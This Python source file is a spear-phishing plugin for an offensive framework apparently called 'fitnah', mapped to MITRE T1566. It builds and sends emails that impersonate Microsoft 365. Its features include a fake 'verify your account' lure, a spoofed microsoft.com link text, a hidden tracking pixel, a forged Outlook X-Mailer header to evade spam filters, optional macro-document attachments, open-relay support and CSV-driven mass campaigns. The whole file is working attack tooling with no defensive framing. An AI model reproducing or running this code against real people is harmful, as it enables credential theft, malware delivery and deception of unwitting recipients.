"""initial_access/phish_email — Send spear-phishing emails with tracking. MITRE T1566.001/T1566.002"""
import base64
import smtplib
import ssl
import uuid
import os
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.utils import formatdate, make_msgid
from typing import List, Dict, Optional
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre

# ── HTML email template with Microsoft 365 / SharePoint lure ─────────────────
_HTML_TEMPLATE = """\
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head>
<body style="font-family:Calibri,Arial,sans-serif;font-size:14px;color:#333;margin:0;padding:0">
<table width="100%" cellpadding="0" cellspacing="0" style="max-width:600px;margin:20px auto">
  <tr>
    <td style="background:#0078d4;padding:16px 24px">
      <span style="color:#fff;font-size:20px;font-weight:bold">{org_name}</span>
    </td>
  </tr>
  <tr>
    <td style="padding:32px 24px;background:#fafafa;border:1px solid #e5e5e5">
      <p>Hi {recipient_name},</p>
      <p>{body_text}</p>
      <p style="text-align:center;margin:32px 0">
        <a href="{payload_url}"
           style="background:#0078d4;color:#fff;padding:12px 28px;text-decoration:none;
                  border-radius:4px;font-size:15px;font-weight:bold">
          {cta_text}
        </a>
      </p>
      <p style="font-size:12px;color:#888">
        This link expires in 48 hours. If you did not request this, contact your IT helpdesk.
      </p>
      <p>Regards,<br><strong>{sender_display}</strong><br>{org_name}</p>
    </td>
  </tr>
  <tr>
    <td style="padding:8px 24px;font-size:11px;color:#aaa">
      &copy; {org_name} &mdash;
      <a href="{payload_url}" style="color:#0078d4;text-decoration:none">{display_domain}</a>
    </td>
  </tr>
</table>
<!-- tracking pixel -->
<img src="{tracking_url}" width="1" height="1" style="display:none" alt="">
</body>
</html>
"""

_PLAIN_TEMPLATE = """\
Hi {recipient_name},

{body_text}

Click here to access the document:
{payload_url}

Regards,
{sender_display}
{org_name}
"""


class PhishEmail(BasePlugin):
    NAME        = "phish_email"
    DESCRIPTION = "Send spear-phishing emails via SMTP with tracking pixel, optional attachment, and campaign mode."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1566.001"
    CATEGORY    = "initial_access"

    schema = ParamSchema().add(
        Param("smtp_host",     str,  required=True,
              help="SMTP server hostname (e.g. smtp.gmail.com, smtp.office365.com)"),
        Param("smtp_port",     int,  required=False, default=587,
              help="SMTP port (587=STARTTLS, 465=SSL, 25=plain)"),
        Param("smtp_user",     str,  required=False, default="",
              help="SMTP auth username (leave blank for open relay)"),
        Param("smtp_pass",     str,  required=False, default="",
              help="SMTP auth password or app-specific password"),
        Param("from_addr",     str,  required=True,
              help="Sender email address (can differ from smtp_user for open relays)"),
        Param("from_name",     str,  required=False, default="IT Support",
              help="Sender display name"),
        Param("to",            str,  required=True,
              help="Comma-separated recipient email(s)"),
        Param("subject",       str,  required=False, default="Action Required: Verify Your Account",
              help="Email subject line"),
        Param("payload_url",   str,  required=True,
              help="URL the button / link points to (your delivery server)"),
        Param("tracking_url",  str,  required=False, default="",
              help="Tracking pixel URL (if empty, payload_url + /t/<token> is used)"),
        Param("body_text",     str,  required=False,
              default="We have detected unusual activity on your account. "
                      "Please verify your identity by clicking the button below.",
              help="Body paragraph text"),
        Param("cta_text",      str,  required=False, default="Verify Now",
              help="Call-to-action button text"),
        Param("org_name",      str,  required=False, default="Microsoft 365",
              help="Organisation name shown in lure header"),
        Param("display_domain", str, required=False, default="microsoft.com",
              help="Fake domain shown in footer link text"),
        Param("recipient_name", str, required=False, default="User",
              help="Recipient first name for personalisation"),
        Param("attachment",    str,  required=False, default="",
              help="Path to attachment file (e.g. generated macro .doc)"),
        Param("attachment_name", str, required=False, default="",
              help="Filename shown to recipient (default: basename of attachment path)"),
        Param("targets_file",  str,  required=False, default="",
              help="CSV path for campaign mode: columns name,email[,personalisation]"),
    )

    @mitre("T1566.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        # Campaign mode: load targets from CSV
        targets_file = params.get("targets_file", "").strip()
        if targets_file:
            return self._run_campaign(params, targets_file)

        recipients = [r.strip() for r in params["to"].split(",") if r.strip()]
        results = []
        for addr in recipients:
            ok, msg = self._send_one(params, addr, params.get("recipient_name", addr.split("@")[0]))
            results.append(f"{'[+]' if ok else '[-]'} {addr}: {msg}")
        return ModuleResult.ok(data="\n".join(results), loot_kind="phish_campaign")

    def _run_campaign(self, params: dict, csv_path: str) -> ModuleResult:
        import csv
        results = []
        try:
            with open(csv_path, newline="", encoding="utf-8") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    name  = row.get("name", row.get("email", "User").split("@")[0])
                    email = row.get("email", "").strip()
                    if not email:
                        continue
                    # Per-target personalisation overrides
                    p = dict(params)
                    p["recipient_name"] = name
                    if "body_text" in row and row["body_text"]:
                        p["body_text"] = row["body_text"]
                    ok, msg = self._send_one(p, email, name)
                    results.append(f"{'[+]' if ok else '[-]'} {email} ({name}): {msg}")
        except FileNotFoundError:
            return ModuleResult.err(f"targets_file not found: {csv_path}")
        return ModuleResult.ok(data="\n".join(results), loot_kind="phish_campaign")

    @staticmethod
    def _send_one(params: dict, to_addr: str, recipient_name: str):
        smtp_host    = params["smtp_host"]
        smtp_port    = int(params.get("smtp_port", 587))
        smtp_user    = params.get("smtp_user", "")
        smtp_pass    = params.get("smtp_pass", "")
        from_addr    = params["from_addr"]
        from_name    = params.get("from_name", "IT Support")
        subject      = params.get("subject", "Action Required: Verify Your Account")
        payload_url  = params["payload_url"]
        body_text    = params.get("body_text", "Please verify your identity.")
        cta_text     = params.get("cta_text", "Verify Now")
        org_name     = params.get("org_name", "Microsoft 365")
        display_dom  = params.get("display_domain", "microsoft.com")
        attachment   = params.get("attachment", "").strip()
        att_name     = params.get("attachment_name", "").strip()
        tracking_url = params.get("tracking_url", "").strip()

        # Per-email tracking token so opens can be correlated
        token = uuid.uuid4().hex
        if not tracking_url:
            tracking_url = f"{payload_url.rstrip('/')}/t/{token}"

        # Build MIME message
        msg = MIMEMultipart("alternative")
        msg["From"]       = f"{from_name} <{from_addr}>"
        msg["To"]         = to_addr
        msg["Subject"]    = subject
        msg["Date"]       = formatdate(localtime=True)
        msg["Message-ID"] = make_msgid(domain=from_addr.split("@")[-1])
        # Mimic a legitimate MUA to reduce spam score
        msg["X-Mailer"]   = "Microsoft Outlook 16.0"
        msg["MIME-Version"] = "1.0"

        plain = _PLAIN_TEMPLATE.format(
            recipient_name=recipient_name, body_text=body_text,
            payload_url=payload_url, sender_display=from_name, org_name=org_name,
        )
        html = _HTML_TEMPLATE.format(
            recipient_name=recipient_name, body_text=body_text,
            payload_url=payload_url, cta_text=cta_text, org_name=org_name,
            display_domain=display_dom, sender_display=from_name,
            tracking_url=tracking_url,
        )

        msg.attach(MIMEText(plain, "plain", "utf-8"))
        msg.attach(MIMEText(html,  "html",  "utf-8"))

        # Optional attachment
        if attachment and os.path.isfile(attachment):
            outer = MIMEBase("application", "octet-stream")
            with open(attachment, "rb") as f:
                outer.set_payload(f.read())
            encoders.encode_base64(outer)
            name = att_name or os.path.basename(attachment)
            outer.add_header("Content-Disposition", "attachment", filename=name)
            # Wrap in multipart/mixed so HTML alternative is preserved
            wrapper = MIMEMultipart("mixed")
            wrapper["From"]       = msg["From"]
            wrapper["To"]         = msg["To"]
            wrapper["Subject"]    = msg["Subject"]
            wrapper["Date"]       = msg["Date"]
            wrapper["Message-ID"] = msg["Message-ID"]
            wrapper["X-Mailer"]   = msg["X-Mailer"]
            wrapper.attach(msg)
            wrapper.attach(outer)
            msg = wrapper

        try:
            ctx = ssl.create_default_context()
            if smtp_port == 465:
                with smtplib.SMTP_SSL(smtp_host, smtp_port, context=ctx) as srv:
                    if smtp_user:
                        srv.login(smtp_user, smtp_pass)
                    srv.sendmail(from_addr, [to_addr], msg.as_string())
            else:
                with smtplib.SMTP(smtp_host, smtp_port) as srv:
                    srv.ehlo()
                    if smtp_port == 587:
                        srv.starttls(context=ctx)
                        srv.ehlo()
                    if smtp_user:
                        srv.login(smtp_user, smtp_pass)
                    srv.sendmail(from_addr, [to_addr], msg.as_string())
            return True, f"sent (tracking={token})"
        except Exception as e:
            return False, str(e)
